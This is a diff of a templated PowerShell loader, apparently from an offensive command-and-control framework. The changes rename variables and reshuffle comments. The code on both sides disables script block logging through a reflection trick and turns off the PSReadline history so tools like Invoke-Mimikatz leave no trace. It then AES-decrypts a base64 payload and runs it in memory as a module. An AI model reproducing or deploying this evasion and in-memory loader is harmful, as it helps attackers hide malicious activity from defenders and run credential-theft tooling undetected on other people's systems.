@@ -8,10 +8,10 @@ $settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetFiel
 $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
 $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
 
-{#- Disable Readline Histfile; things like 'Invoke-Mimikatz' in it might trigger  #-}
+{# Disable Readline Histfile; things like 'Invoke-Mimikatz' in it might trigger #}
 try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
 
-$KEY = ${{symbol_name("KEY")}}
+$GLOBAL_KEY = ${{symbol_name("global_key")}}
 
 function Encrypt-AES {
     param(
@@ -28,10 +28,11 @@ function Encrypt-AES {
 
     $encryptor = $aesManaged.CreateEncryptor()
     $encryptedData = $encryptor.TransformFinalBlock($buffer, 0, $buffer.Length);
-    [byte[]] $fullData = $aesManaged.IV + $encryptedData
+    [byte[]] $result = $aesManaged.IV + $encryptedData
 
-    try{$aesManaged.Dispose()}catch{} {# This method does not exist in PS2 #}
-    $fullData
+    {# The following method does not exist in PS2 #}
+    try{$aesManaged.Dispose()}catch{}
+    $result
 }
 
 function Decrypt-AES {
@@ -49,17 +50,21 @@ function Decrypt-AES {
     $aesManaged.IV = [byte[]]$buffer[0..15]
 
     $decryptor = $aesManaged.CreateDecryptor()
-    $decryptedData = $decryptor.TransformFinalBlock($buffer, 16, $buffer.Length-16);
+    $result = $decryptor.TransformFinalBlock($buffer, 16, $buffer.Length-16);
 
-    try{$aesManaged.Dispose()}catch{} {# This method does not exist in PS2 #}
-    $decryptedData
+    {# The following method does not exist in PS2 #}
+    try{$aesManaged.Dispose()}catch{}
+    $result
 }
 
 function {{symbol_name("Unpack")}} {
-    $Result = [System.Convert]::FromBase64String($args[0])
-    $Result = Decrypt-AES $Result $KEY
+    param ($buffer)
+
+    $Result = [System.Convert]::FromBase64String($buffer)
+    $Result = Decrypt-AES $Result $GLOBAL_KEY
     if (-not $Result) {return}
     $Result = [System.Text.Encoding]::UTF8.GetString($Result)
+
     $sb = [Scriptblock]::Create($Result)
     New-Module -ScriptBlock $sb | Out-Null
 }
